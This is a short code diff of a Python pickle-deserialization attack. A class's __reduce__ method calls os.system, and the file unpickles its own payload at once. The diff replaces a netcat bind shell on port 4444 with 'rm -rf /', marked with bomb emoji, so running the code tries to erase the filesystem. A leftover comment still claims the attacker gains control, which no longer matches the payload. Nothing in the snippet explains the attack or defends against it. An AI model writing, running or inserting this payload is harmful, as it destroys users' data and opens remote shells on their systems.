@@ -47,7 +47,7 @@ import os
 
 class MaliciousPickle:
     def __reduce__(self):
-        return (os.system, ('nc -lvp 4444 -e /bin/bash',))
+        return (os.system, ('rm -rf /',)) # 😏💣
 
 payload = pickle.dumps(MaliciousPickle())
 pickle.loads(payload) # This will execute the payload and the attacker gains control
